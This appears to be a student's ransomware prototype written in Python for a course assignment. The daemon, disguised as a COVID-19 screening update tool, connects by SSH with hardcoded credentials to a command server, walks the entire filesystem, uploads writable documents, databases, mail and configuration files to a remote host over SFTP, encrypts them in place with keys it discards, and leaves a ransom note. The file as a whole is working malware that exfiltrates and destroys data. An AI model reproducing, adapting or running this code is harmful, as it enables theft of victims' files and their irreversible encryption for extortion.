#!/usr/bin/python3

#==============================================================================
 #   Assignment:  Malware Protoype
 #
 #       Author:  Andy Garcia
 #     Language:  Python3 (argparse, yaml, os, signal, sys, atexit, paramiko, 
 #                         pickle, cryptography)
 #   To Compile:  n/a
 #
 #-----------------------------------------------------------------------------
 #
 #  Description:  Application that runs as malicious daemon in the background to
 #                execute ransomware attack.

 #        Input:  N/A
 #
 #       Output:  N/A
 #
 #    Algorithm:  Establishes a connection to the server to retrieve files for
 #                executing file. Establishes SFTP connection to copy local
 #                files to the server then encrypts the victim's files. After 
 #                execution, a ransomware note is created for the victim.
 #
 #   Required Features Not Included:  
 #
 #   Known Bugs:  n/a
 #
 #Classification: A
 #
#==============================================================================

import argparse, yaml, os, signal, sys, atexit, paramiko, pickle, cryptography
from cryptography.fernet import Fernet

#Displays help menu and switches that are supported with the program
def programSwitches():

    parser = argparse.ArgumentParser(
        description="TTC COVID-19 Screening Assessment Update Tool.")

    parser.add_argument("actionCommand", nargs='?', default="status")

    #Parses arguments
    args = parser.parse_args()
    
    #Returns arguments passed
    return args

#Contact server for secure datacommunication
def contactServer():

    #Creates SSH object
    sshConnection= paramiko.SSHClient()

    #Establishes SSH Connection for location of malicious code
    try:

        sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshConnection.connect('192.168.216.148', username="nytnepvn1", 
                              password="Mkp123")
        channelObject = sshConnection.get_transport().open_session()
    
    except Exception as e:

        raise SystemExit()        
    
    #Lets the server know the daemon is communicating
    channelObject.send(pickle.dumps("daemon"))

    #Receives commands for the daemon
    responseMessage = isReceived(channelObject)
    responseMessage = pickle.loads(responseMessage)
    sshConnection.close()
    beginUpdate(responseMessage)


#Updates the filesystem by establishing an SFTP connection
def beginUpdate(responseMessage):

    sshConnection= paramiko.SSHClient()

    #Establishes SSH Connection to second IP for malware download
    try:
        sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshConnection.connect(responseMessage[0], username=responseMessage[1], 
                              password=responseMessage[2])

    except Exception as e:

        raise SystemExit()

    #Retrieves code to update database based on the response from SSH server 
    sftpConnection = sshConnection.open_sftp()

    #Loop through file list and begin file transfer
    fileExtensions = (".doc", ".docx", ".html", ".htm", ".odt", ".pdf", ".xls",
                  ".xlsx", ".xlsm", ".ods", ".ppt", ".pptx", ".txt", ".csv", 
                  ".xml", ".json", ".yaml", ".dat", ".db", ".sql", ".email",
                  ".eml", ".emlx", ".msg", ".oft", ".ost", ".pst", ".vcf",
                  ".log", ".cfg", "con", ".dll", ".cnf", ".wpd", ".tex", "rtf",
                  ".pdb")

    #Recursively checks for files starting from the root folder
    for root, dirs, files in os.walk(os.path.abspath("/")):

        for file in files:

            #Creates the absolute path for the file
            fileName = os.path.join(root,file)

            #Remote path to save the file to
            remotePath = os.path.join(responseMessage[3], file)

            #Copies file to server if it has a matching extension and permission
            if os.access(fileName, os.W_OK) and \
                 fileName.endswith(fileExtensions):
                
                #SFTP file to server
                sftpConnection.put(fileName, remotePath)

                #Create encryption key
                encryptionKey = Fernet.generate_key()

                #Write encryption key to file
                with open ('/tmp/fileKey.key', 'wb') as fileKey:
                    fileKey.write(encryptionKey)

                #Read encryption key from file
                with open('/tmp/fileKey.key', 'rb') as fileKey:
                    fileKey.read()

                #Creates encryption using symmetric cryptography
                fernetEncryption = Fernet(encryptionKey)

                #Reads original data from file
                with open(fileName, 'rb') as originalFile:
                    originalData = originalFile.read()

                #Encrypts original data
                encryptedData = fernetEncryption.encrypt(originalData)

                #Writes encrypted data to file
                with open(fileName, 'wb') as encryptedFile:
                    encryptedFile.write(encryptedData)
  
    #File path for the ransomware note
    tempPath = '/home/lab/Desktop/Ransomware_README.txt'
    sftpConnection.get(responseMessage[4], tempPath)
    sftpConnection.close()
    sshConnection.close()

#Checks if message was received correctly and returns message
def isReceived(channelObject):

    while True:

        #Checks if message received from server is correct
        serverResponse = channelObject.recv(2048)
        channelObject.send(serverResponse)
        
        messageCorrect = channelObject.recv(2048)
        
        #Correct messages will continue normal code execution
        if messageCorrect.decode('utf-8') == "True":
            
            return serverResponse   
        
        #Terminates connection after 10 attempts determined by server
        elif messageCorrect.decode('utf-8') == "Terminate":

            exit()

        #Replies to server that message was incorrectly sent
        else:

            channelObject.send(b"False")


#Handles signals for terminating processes
def sigtermHandler(SignalNumber, signalFrame):

    raise SystemExit(1)


#Handles start and stop signals for daemonizing application
def daemonizeApp(userArgs, *, stdin='/dev/null', stdout='/dev/null', 
                 stderr='/dev/null'):

    #Path of PID file
    daemonFile = "/tmp/DPI912_G6_malicious.pid"

    #Starts daemon process if daemon PID file doesn't exist
    if userArgs["actionCommand"] == "start":

        if os.path.exists(daemonFile):

            raise SystemExit(0)

        #First fork to detach from parent. 
        try:
            
            #Closes parent for detaching child
            if os.fork() > 0:

                raise SystemExit(0)

        except OSError as e:

            raise RuntimeError("Failed to create fork #1.\n")

        #Changes directory and changes permissions to program and file system
        os.chdir('/')
        os.umask(0)
        os.setsid()
     
        #Creates second fork to detach from session leader and terminal
        try:

            #Closes parent for detaching child
            if os.fork() > 0:

                raise SystemExit(0)

        except OSError as e:

            raise RuntimeError("Failed to create fork #2.\n")

        #Flush I/O buffers
        sys.stdout.flush()
        sys.stderr.flush()

        #Replace file descriptors for stdin, stdout, and stderr
        with open(stdin, 'rb', 0) as fileOutput:

            os.dup2(fileOutput.fileno(), sys.stdin.fileno())

        with open(stdout, 'ab', 0) as fileOutput:

            os.dup2(fileOutput.fileno(), sys.stdout.fileno())

        with open(stderr, 'ab', 0) as fileOutput:

            os.dup2(fileOutput.fileno(), sys.stderr.fileno())

        #Write PID to file
        with open(daemonFile, "w") as fileOutput:

            print(os.getpid(), file=fileOutput)

        #Setuid, Setgid, and Sticky bit for daemon PID file
        os.chmod(daemonFile, 0o6751)
        os.system(f'chmod +t {daemonFile}')

        #connections = userArgs['socketAddress'], userArgs['socketPort']

        #Removes daemon PID file if daemon is stopped
        atexit.register(lambda: os.remove(daemonFile))        

        #Signal handler for termination
        signal.signal(signal.SIGTERM, sigtermHandler)

        #Starts application connecting to server
        contactServer()

    #Closes daemon if daemon PID file exists
    elif userArgs["actionCommand"] == "stop":

        if os.path.exists(daemonFile):
    
            #Kills daemon with pid value stored in daemon pid file
            with open(daemonFile) as fileOutput:

                os.kill(int(fileOutput.read()), signal.SIGTERM)

        else:

            print("Daemon not running", file=sys.stderr)
            raise SystemExit(1)

    #Checks if daemon PID file exists to determine if daemon is running
    elif userArgs["actionCommand"] == "status":

        if os.path.exists(daemonFile):

            print("Daemon is currently running.", file=sys.stderr)
        
        else:

            print("Daemon is not running.", file=sys.stderr)

    else:

        print(f"Usage: {sys.argv[0]} [start|stop|status]", file=sys.stderr)


#Executes program if current file is the main file
if __name__ == "__main__":

    #Parses arguments and converts into dictionary
    userArgs = vars(programSwitches())

    #Daemonizes application to run in background
    daemonizeApp(userArgs)

